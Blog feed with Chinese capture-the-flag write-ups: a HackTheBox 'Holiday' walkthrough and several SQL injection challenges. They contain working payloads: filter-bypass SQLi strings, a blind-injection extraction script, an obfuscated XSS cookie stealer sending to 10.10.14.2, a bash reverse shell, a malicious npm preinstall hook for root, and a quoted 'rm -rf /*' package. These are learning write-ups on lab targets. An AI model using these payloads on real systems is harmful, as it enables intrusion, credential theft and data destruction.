<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-17T21:00:43+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Yueyejian’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><author><name>yueyejian</name></author><entry><title type="html">HackTheBox - Holiday</title><link href="http://localhost:4000/hack-the-box/holiday/" rel="alternate" type="text/html" title="HackTheBox - Holiday" /><published>2023-04-18T00:00:00+08:00</published><updated>2023-04-18T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/holiday</id><content type="html" xml:base="http://localhost:4000/hack-the-box/holiday/"><![CDATA[<p><img src="/images/hackthebox/holiday/0.png" alt="" /></p>

<h2 id="信息搜集">信息搜集</h2>
<h3 id="nmap">nmap</h3>
<p>通过nmap扫描发现了靶机只存在ssh和Node.js框架下的http服务。进入网站首页并没有发现什么有用的信息。</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Tue Apr 18 07:38:06 2023 as: nmap -Pn -sV -sC -A -oN nmap.txt 10.10.10.25
Nmap scan report for 10.10.10.25
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
|   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
|_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (ED25519)
8000/tcp open  http    Node.js Express framework
|_http-title: Error
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/18%OT=22%CT=1%CU=34005%PV=Y%DS=2%DC=T%G=Y%TM=643E815
OS:5%P=i686-pc-windows-windows)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)SEQ(
OS:SP=100%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)SEQ(CI=I%II=I)OPS(O1=M550ST11NW
OS:7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M550ST11NW7%O6=M550ST
OS:11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40
OS:%W=7210%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R
OS:=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%U
OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   258.00 ms 10.10.14.1
2   258.00 ms 10.10.10.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 18 07:39:01 2023 -- 1 IP address (1 host up) scanned in 55.41 seconds
</code></pre></div></div>
<h3 id="dirserch">dirserch</h3>
<p><img src="/images/hackthebox/holiday/1.png" alt="" /></p>

<p>访问/login或者访问/admin跳转至login是一个简单的登录页面，尝试了默认用户以及爆破用户名都回显 Invalid User</p>

<p><img src="/images/hackthebox/holiday/2.png" alt="" /></p>

<p>通过简单的手工测试，发现账号后面加上双引号产生报错，sql注入大概率有了</p>

<p><img src="/images/hackthebox/holiday/3.png" alt="" /></p>

<h3 id="sqlmap">sqlmap</h3>

<p>把数据包丢进sqlmap里面跑，但是不加参数跑不出来，需要加上level和risk</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5
=================================================================================================================
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 474 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin") OR NOT 8580=8580 AND ("MLnl"="MLnl&amp;password=admin

    Type: time-based blind
    Title: SQLite &gt; 2.0 OR time-based blind (heavy query)
    Payload: username=admin") OR 3510=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ("YPRb"="
YPRb&amp;password=admin
---
[08:32:00] [INFO] the back-end DBMS is SQLite
web application technology: Express
back-end DBMS: SQLite
</code></pre></div></div>

<p>查看表</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5 --tables
================================================================================
&lt;current&gt;
[5 tables]
+-----------------+
| bookings        |
| notes           |
| sessions        |
| sqlite_sequence |
| users           |
+-----------------+
</code></pre></div></div>
<p>查看user表中的数据，得到账号 RickA和密码的md5，解密后得到密码</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5 -T users --dump
===========================================================================================================================
[08:38:00] [INFO] retrieved: 103
[08:39:13] [INFO] retrieved: CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,active
 TINYINT(1))
[08:39:13] [INFO] fetching entries for table 'users'
[08:39:13] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[08:39:13] [INFO] retrieved: 1
[08:39:14] [INFO] retrieving the length of query output
[08:39:14] [INFO] retrieved: 1
[08:39:16] [INFO] retrieved: 1
[08:39:19] [INFO] retrieving the length of query output
[08:39:19] [INFO] retrieved: 1
[08:39:20] [INFO] retrieved: 1
[08:39:23] [INFO] retrieving the length of query output
[08:39:23] [INFO] retrieved: 32
[08:39:49] [INFO] retrieved: fdc8cd4cff2c19e0d1022e78481ddf36
[08:39:49] [INFO] retrieving the length of query output
[08:39:49] [INFO] retrieved: 5
[08:39:55] [INFO] retrieved: RickA
[08:39:55] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: &lt;current&gt;
Table: users
[1 entry]
+----+--------+----------+----------------------------------+
| id | active | username | password                         |
+----+--------+----------+----------------------------------+
| 1  | 1      | RickA    | fdc8cd4cff2c19e0d1022e78481ddf36 |
+----+--------+----------+----------------------------------+
</code></pre></div></div>

<h2 id="储存型xss">储存型XSS</h2>

<p>登录RickA的账号后，得到一个订单管理系统。随便点开一个订单，里面有一个添加note的功能，而且此处提供了线索，提交的留言将在一分钟之内被管理员审核，故可尝试XSS来让管理员执行JavaScript脚本。</p>

<p><img src="/images/hackthebox/holiday/4.png" alt="" /></p>

<p>尝试提交<code class="language-plaintext highlighter-rouge">&lt;script src='http://10.10.14.2/xsstest'&gt;&lt;/script&gt;</code></p>

<p><img src="/images/hackthebox/holiday/5.png" alt="" /></p>

<p>发现脚本中的<code class="language-plaintext highlighter-rouge">&lt;</code>和<code class="language-plaintext highlighter-rouge">&gt;</code>被编码成了<code class="language-plaintext highlighter-rouge">&amp;amp;lt;</code>和<code class="language-plaintext highlighter-rouge">&amp;amp;gt;</code>，而且本地没有任何反应。</p>

<p>以下文档存在很多xss绕过手法，很有参考价值。</p>

<p>https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</p>

<p>最后绕过的方法是</p>

<p><code class="language-plaintext highlighter-rouge">&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode(CHARCODE_HERE));&lt;/script&gt;"&gt;</code></p>

<p>其中的CHARCODE_HERE由<code class="language-plaintext highlighter-rouge">document.write('&lt;script src="http://10.10.14.2/yyj.js"&gt;&lt;/script&gt;');</code>转化成CharCode得到</p>

<p>python代码如下：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; payload='''document.write('&lt;script src="http://10.10.14.2/yyj.js"&gt;&lt;/script&gt;');'''
&gt;&gt;&gt; ','.join([str(ord(c)) for c in payload])
'100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,1
12,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59'
</code></pre></div></div>
<p>最后得到的payload：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;"&gt;
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.25] 43950
GET /yyj.js HTTP/1.1
Accept: */*
Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.14.2
</code></pre></div></div>
<p>接下来在本机起一个http服务</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530\Desktop\Holiday&gt;python -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
</code></pre></div></div>
<p>yyj.js文件内容：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window.addEventListener('DOMContentLoaded', function(e) {
    window.location = "http://10.10.14.2:81/?cookie=" + encodeURI(document.getElementsByName("cookie")[0].value)
})
</code></pre></div></div>
<p>然后在监听81端口以及80端口的yyj.js文件可以正常访问的情况下，重新提交最终的payload</p>

<p><img src="/images/hackthebox/holiday/6.png" alt="" /></p>

<p>得到管理员的cookie</p>

<p><img src="/images/hackthebox/holiday/7.png" alt="" /></p>

<h2 id="command-injection">Command Injection</h2>

<p><img src="/images/hackthebox/holiday/8.png" alt="" /></p>

<p>通过cookie伪造了管理员之后访问 /admin得到了导出订单的按钮，点击之后可以发现是类似数据库的查询功能，并且可查数据库中之前用到的users表</p>

<p><img src="/images/hackthebox/holiday/9.png" alt="" /></p>

<p>随便在users后面加一个双引号试试，得到了以下的返回，我们的表名限制在了小写字母、数字、<code class="language-plaintext highlighter-rouge">&amp;</code> 、<code class="language-plaintext highlighter-rouge">/</code>以及空格组成的白名单内</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invalid table name - only characters in the range of [a-z0-9&amp;\s\/] are allowed
</code></pre></div></div>

<p>经测试，用url编码之后的<code class="language-plaintext highlighter-rouge">&amp;</code>拼接语句可触发命令注入漏洞<code class="language-plaintext highlighter-rouge">/admin/export?table=users%26id</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
1|RickA|fdc8cd4cff2c19e0d1022e78481ddf36|1
</code></pre></div></div>

<p>现在注入点有了，但是存在白名单限制，怎么去bypass呢？可以先在本机起一个http服务，把反弹shell的脚本挂在上面，然后用wget命令访问十进制或者六进制转换后的ip地址+文件名，再用bash命令执行此文件。</p>

<p>以下网站有一些简单的反弹shell脚本：
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</p>

<p>前面挂js恶意代码的时候已经开启了http服务了，我们只需要在网站根目录新建一个用来反弹shell的文件，名叫rev</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#! /bin/bash
bash -i &gt;&amp; /dev/tcp/10.0.14.2/2333 0&gt;&amp;1
</code></pre></div></div>
<p>然后用nc监听2333端口</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lvp 2333
listening on [any] 2333 ...
</code></pre></div></div>

<p>把本地的ip地址转换成十进制数</p>

<p>https://www.browserling.com/tools/ip-to-dec</p>

<p><img src="/images/hackthebox/holiday/10.png" alt="" /></p>

<p>值得一提的是十进制和六进制的ip地址都可以被windows、linux系统解析，比如把127.0.0.1分别转换成十进制和六进制<code class="language-plaintext highlighter-rouge">2130706433</code> <code class="language-plaintext highlighter-rouge">0x7f000001</code>，ping一下试试</p>

<p><img src="/images/hackthebox/holiday/11.png" alt="" /></p>

<p>上传rev，回显200
<img src="/images/hackthebox/holiday/12.png" alt="" /></p>

<p>并且web服务器也收到信号</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:10.10.10.25 - - [18/Apr/2023 22:05:48] "GET /rev HTTP/1.1" 200 -
</code></pre></div></div>
<p>通过ls命令可以看到rev文件上传成功了，因为网有点卡我多点了几次，所以有重复的文件，但是我们只需要看rev就行了
<img src="/images/hackthebox/holiday/13.png" alt="" /></p>

<p>访问<code class="language-plaintext highlighter-rouge">/admin/export?table=b%26bash+rev</code>执行反弹shell命令，成功得到了webshell</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lnvp 2333
listening on [any] 2333 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.25] 46894
bash: cannot set terminal process group (1137): Inappropriate ioctl for device
bash: no job control in this shell
algernon@holiday:~/app$ whoami
whoami
algernon
algernon@holiday:~/app$
</code></pre></div></div>

<p>成功拿到第一个flag</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/app$ cd ..
cd ..
algernon@holiday:~$ ls
ls
app
user.txt
algernon@holiday:~$ cat user.txt
cat user.txt
e9451...........................
</code></pre></div></div>
<h2 id="提权">提权</h2>

<h3 id="npm-install-dangerous">npm install dangerous</h3>

<p>首先检查一下<code class="language-plaintext highlighter-rouge">sudo -l</code>，有可能会发现惊喜</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~$ sudo -l
sudo -l
Matching Defaults entries for algernon on holiday:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User algernon may run the following commands on holiday:
    (ALL) NOPASSWD: /usr/bin/npm i *
</code></pre></div></div>

<p>发现npm可以不需要密码以管理员权限运行<code class="language-plaintext highlighter-rouge">/usr/bin/npm i *</code>，npm的全称是Node Package Manager，是一个NodeJS包管理和分发工具，已经成为了非官方的发布Node模块（包）的标准。</p>

<p>谷歌一下npm install dangerous，大概思路是nodejs包是一个叫<code class="language-plaintext highlighter-rouge">package.json</code>的文件，其格式如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
  "name": "rimrafall",
  "version": "1.0.0",
  "description": "rm -rf /* # DO NOT INSTALL THIS",
  "main": "index.js",
  "scripts": {
    "preinstall": "rm -rf /* /.*"
  },
  "keywords": [
    "rimraf",
    "rmrf"
  ],
  "author": "João Jerónimo",
  "license": "ISC"
}
</code></pre></div></div>
<p>其中<code class="language-plaintext highlighter-rouge">preinstall</code>中的预安装命令会在安装这个包之前执行。这也是为什么npm install存在危险。在这台靶机中我们需要创建一个文件夹，再创建一个<code class="language-plaintext highlighter-rouge">package.json</code>来模拟nodejs应用，node包中需要有name和version这两个参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj$ cat package.json
cat package.json
{
  "name": "root_please",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}
</code></pre></div></div>
<p>在package.json的上一级目录yyj执行<code class="language-plaintext highlighter-rouge">sudo npm i yyj/ --unsafe</code>就能获取root权限了，随后拿到root权限下的flag</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj$ cd ..
cd ..
algernon@holiday:~$ ls
ls
app
node_modules
user.txt
yyj
algernon@holiday:~$ sudo npm i yyj/ --unsafe
sudo npm i yyj/ --unsafe

&gt; root_please@1.0.0 preinstall /home/algernon/node_modules/.staging/root_please-f4b1cb59
&gt; /bin/bash

ls
package.json
whoami
root
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@holiday:~/node_modules/.staging/root_please-f4b1cb59# cd /root
cd /root
root@holiday:/root# ls
ls
root.txt
root@holiday:/root# cat root.txt
cat root.txt
592d9c91924793c4c8b8ed..........
</code></pre></div></div>
<h2 id="小结">小结</h2>
<p>这是我pawd的第一台hackthebox靶机，看到这个界面心里难免有些激动，虽然是看walkthrough做出来的，但是也花了大概一两天的时间拿下靶机以及完成记录。就当做是一个新的开始吧！走起~</p>

<p><img src="/images/hackthebox/holiday/14.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="node" /><category term="linux" /><category term="web" /><category term="sqli" /><category term="xss" /><category term="command-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">极客大挑战2019 - SQLI</title><link href="http://localhost:4000/ctf/geekchall/" rel="alternate" type="text/html" title="极客大挑战2019 - SQLI" /><published>2020-01-08T00:00:00+08:00</published><updated>2020-01-08T00:00:00+08:00</updated><id>http://localhost:4000/ctf/geekchall</id><content type="html" xml:base="http://localhost:4000/ctf/geekchall/"><![CDATA[<h2 id="题目描述">题目描述</h2>

<p>极客大挑战2019的sql注入系列一共有5个题目，感觉非常有意思啊，就好像自己化身为了一名黑客</p>

<h2 id="easysql">EasySQL</h2>

<p>这题没什么好说的，万能密码一试就成功了</p>

<p><img src="/images/ctf/geekchall/0.jpg" alt="" /></p>

<p>网站做的确实非常精湛！！</p>

<p><img src="/images/ctf/geekchall/1.jpg" alt="" /></p>

<h2 id="lovesql">LoveSQL</h2>
<p>用上面的万能密码登录进去后，没有flag，而是给出了一串密码，让人不禁联想到sql查询。在加上登录界面的提示，可以判断flag应该在数据库的某个地方</p>

<p><img src="/images/ctf/geekchall/2.jpg" alt="" /></p>

<p>接下来在输入用户名处拼接常规的sql注入语句就行了，payload可以参考</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span><span class="err">爆出所有库名</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">distinct</span> <span class="n">table_schema</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span>
<span class="o">#</span><span class="err">爆出数据库</span><span class="n">news</span><span class="err">的所有表名</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">distinct</span> <span class="k">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="n">table_schema</span> <span class="o">=</span> <span class="s1">'news'</span>
<span class="o">#</span><span class="err">爆出表</span><span class="k">admin</span><span class="err">的所有列</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">distinct</span> <span class="k">column_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="k">table_name</span> <span class="o">=</span> <span class="s1">'admin'</span>
<span class="o">#</span><span class="err">查</span><span class="n">username</span><span class="err">和</span><span class="n">password</span><span class="err">，中间用</span><span class="p">:</span><span class="err">隔开</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">from</span> <span class="k">admin</span>
</code></pre></div></div>

<h2 id="babysql">BabySQL</h2>
<p>这题应该才是我真正想写的一题。这题确实和登录界面说的一样，和之前的不同，做了严格的过滤。（2333</p>

<p><img src="/images/ctf/geekchall/3.jpg" alt="" /></p>

<p>稍微看仔细点，就能发现很多关键单词比如or、where、select等都被替换为空了。解决的方法很简单，因为这道题只替换了一次，所以可以在一个单词里再写一个这个单词，比如把or写成oorr，就可以绕过这个“严格”的过滤了</p>

<p><img src="/images/ctf/geekchall/4.jpg" alt="" /></p>

<p>查当前库名</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,database()#
</span></code></pre></div></div>
<p>爆出所有表</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,group_concat(distinct table_name) frfromom infoorrmation_schema.columns whwhereere table_schema = '</span><span class="n">geek</span><span class="s1">'#
</span></code></pre></div></div>
<p>爆出所有列</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,group_concat(distinct column_name) frfromom infoorrmation_schema.columns whwhereere table_name = '</span><span class="n">b4bsql</span><span class="s1">'#
</span></code></pre></div></div>
<p>爆字段</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,group_concat(id,0x3a,username,0x3a,passwoorrd) frofromm b4bsql#
</span></code></pre></div></div>

<h2 id="hardsql">HardSQL</h2>
<p>一开始先简单测试一下，发现过滤了空格，而且怎么绕都绕不过去，然后去网上找wp发现是报错注入。值得注意的是这里用到了一个还没见过的新操作,用’^’来连接updatexml函数，结合了异或</p>

<p>查当前数据库名</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)#
</span></code></pre></div></div>
<p>查表名</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('</span><span class="n">geek</span><span class="s1">'))),0x7e),1)#
</span></code></pre></div></div>
<p>查列名</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('</span><span class="n">H4rDsq1</span><span class="s1">'))),0x7e),1)#
</span></code></pre></div></div>
<p>最后这里查flag内容的时候，由于updtexml最多显示32的长度，导致flag显示不全。然后用substr截取一下，发现substr被过滤了，于是上网找了另一种操作，用left和right截取函数分两次得到了完整的flag</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1)#
</span></code></pre></div></div>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1)#
</span></code></pre></div></div>

<h2 id="finalsql">FinalSQL</h2>
<p>这道题和之前的题不太一样，可以看到给出了5个紫色的选项，分别对应着5个不同的id，但是这几个id都没什么用</p>

<p><img src="/images/ctf/geekchall/5.jpg" alt="" /></p>

<p>试着在用户名和密码处进行注入，但是发现用户名和密码处有严格的过滤，大部分SQL注入的关键词都被过滤了</p>

<p><img src="/images/ctf/geekchall/6.jpg" alt="" /></p>

<p>然后尝试在上面的那几个id处进行注入，发现空格也被过滤了，和上面的hardsql一样绕不过去，那么用上面hardsql的报错注入语句试试</p>

<p><img src="/images/ctf/geekchall/7.jpg" alt="" /></p>

<p>发现有东西被过滤了，测试了一下发现被过滤的是0x7e，把它改成~反而绕过了过滤，然后再试试</p>

<p><img src="/images/ctf/geekchall/8.jpg" alt="" /></p>

<p>然而可能是界面处理的比较好，并没有报错出什么有用的信息。主界面有个小提示，出现了SQL盲注的字样，那么来尝试一下盲注吧</p>

<p>结合异或注入的小技巧，构造id=1^1^1, 返回id=1的结果</p>

<p><img src="/images/ctf/geekchall/9.jpg" alt="" /></p>

<p>id=1^0^1，返回id=0的结果（注意是三个感叹号）</p>

<p><img src="/images/ctf/geekchall/10.jpg" alt="" /></p>

<p>那么构造 id = 1^(length(database())&gt;3)^1，返回的是id=1的结果，即(length(database())&gt;3) = 1，是真的，说明当前数据库的长度大于3</p>

<p><img src="/images/ctf/geekchall/11.jpg" alt="" /></p>

<p>根据这个原理，构造id=1^(ascii(substr((select(database())),1,1))&gt;<strong>100</strong>)^1, 不停的改变100那里的数值，即可判断出当前数据库的第一个字符是什么</p>

<p>然后可以借助burpsuite的intruder模块，试出数据库名，表名等。也可以写python脚本，如果数据太长的话，不写脚本是很慢的。这里给出最后已经查出了表名(F1naI1y，而且根据前几题sql题知道放flag的列都是password)之后查flag的脚本</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://c1e6b438-7a2c-47fd-9473-96e47707df3a.node3.buuoj.cn/search.php</span><span class="sh">"</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">180</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">128</span><span class="p">):</span>
        <span class="n">d</span> <span class="o">=</span> <span class="sh">"</span><span class="s">?id=1^(ascii(substr((select(group_concat(distinct(password)))from(F1naI1y)),</span><span class="sh">'"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="sh">"'</span><span class="s">,1))=</span><span class="sh">'"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="sh">"'</span><span class="s">)^1</span><span class="sh">"</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">d</span><span class="p">)</span>
        <span class="k">if</span> <span class="sh">'</span><span class="s">Click</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">j</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;ctf&quot;]" /><category term="sqli" /><category term="web" /><category term="ctf" /><summary type="html"><![CDATA[题目描述]]></summary></entry><entry><title type="html">Ciscn2019 华北赛区 day2 web1 - hack world</title><link href="http://localhost:4000/ctf/hackworld/" rel="alternate" type="text/html" title="Ciscn2019 华北赛区 day2 web1 - hack world" /><published>2019-12-27T00:00:00+08:00</published><updated>2019-12-27T00:00:00+08:00</updated><id>http://localhost:4000/ctf/hackworld</id><content type="html" xml:base="http://localhost:4000/ctf/hackworld/"><![CDATA[<h2 id="0x01-题目描述">0x01 题目描述</h2>

<p><img src="/images/ctf/hackworld/0.jpg" alt="" /></p>

<p>很明显这是一道sql注入的题目，已经给出了flag所在的列名和表名，且提供一个id查询的功能。当提交1和2的时候，查询出了两句骚话</p>

<p><code class="language-plaintext highlighter-rouge">Hello, glzjin wants a girlfriend.</code></p>

<p><code class="language-plaintext highlighter-rouge">Do you want to be my girlfriend?</code></p>

<h2 id="0x02-获取flag">0x02 获取flag</h2>
<p>尝试输入一些常规的sql注入语句，结果都被过滤了，尝试异或注入，输入1^1^1，返回了id=1的结果</p>

<p><img src="/images/ctf/hackworld/1.jpg" alt="" /></p>

<p>SQL中的^是异或判断，当^两边相同的时候，其值为0，当^两边不相同时，其值为1</p>
